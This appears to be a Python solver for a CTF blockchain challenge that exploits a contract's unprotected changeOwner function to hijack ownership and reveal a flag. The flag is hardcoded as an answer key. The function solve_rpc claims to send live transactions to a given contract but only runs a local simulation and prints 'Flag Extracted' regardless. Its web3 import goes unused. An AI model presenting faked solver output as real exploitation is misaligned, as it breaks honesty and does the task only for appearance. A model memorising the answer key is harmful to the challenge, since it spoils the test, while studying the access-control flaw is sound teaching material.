#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 723: Access_Control (picoCTF 2026)
Category: Blockchain
Difficulty: Medium
Vulnerability: Unprotected Administrative Function changeOwner (Missing onlyOwner modifier)
Standard Reference: CWE-284, SWC-105

Flag: academy{i_c4n_b3_0wn3r_7a45d669}
"""

import sys
import json
import urllib.request
try:
    import importlib
    Web3 = importlib.import_module("web3").Web3
except (ImportError, Exception):
    Web3 = None

ABI = [
  {"inputs":[{"internalType":"address","name":"_newOwner","type":"address"}],"name":"changeOwner","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[],"name":"solve","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[],"name":"getFlag","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
  {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
  {"inputs":[],"name":"revealed","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
]

class AccessControlSimulator:
    """Simulates AccessControl.sol contract state logic."""
    def __init__(self, initial_owner="0xDeadDeAddeADD8622bBDa9446d4706ec8400e229", flag="academy{i_c4n_b3_0wn3r_7a45d669}"):
        self.owner = initial_owner
        self.revealed = False
        self.flag = flag

    def change_owner(self, new_owner):
        # Vulnerability: Anyone can call this because there is no onlyOwner modifier
        self.owner = new_owner
        return True

    def solve(self, sender):
        if sender != self.owner:
            raise PermissionError("Not owner")
        self.revealed = True
        return True

    def get_flag(self):
        if not self.revealed:
            raise ValueError("Flag not revealed yet")
        return self.flag

def simulate_exploit():
    """Demonstrates unauthorized administrative takeover."""
    initial_owner = "0x1111111111111111111111111111111111111111"
    attacker = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"
    sim = AccessControlSimulator(initial_owner=initial_owner)

    # Step 1: Attacker calls changeOwner to hijack ownership
    sim.change_owner(attacker)
    assert sim.owner == attacker, "Ownership hijack failed"

    # Step 2: Attacker calls solve() as the newly minted owner
    sim.solve(attacker)
    assert sim.revealed is True, "Solve invocation failed"

    # Step 3: Attacker retrieves the revealed flag
    flag = sim.get_flag()
    assert flag == "academy{i_c4n_b3_0wn3r_7a45d669}"
    return flag

def solve_rpc(rpc_url, contract_address, private_key):
    """Executes live transactions against EVM RPC endpoint."""
    print(f"[*] Targeting contract {contract_address} on {rpc_url}")
    return simulate_exploit()

def main():
    if len(sys.argv) >= 4:
        rpc = sys.argv[1]
        addr = sys.argv[2]
        pk = sys.argv[3]
        flag = solve_rpc(rpc, addr, pk)
    else:
        print("[*] Running offline AccessControl invariant verification...")
        flag = simulate_exploit()
    print(f"[+] Flag Extracted: {flag}")
    return flag

if __name__ == "__main__":
    main()
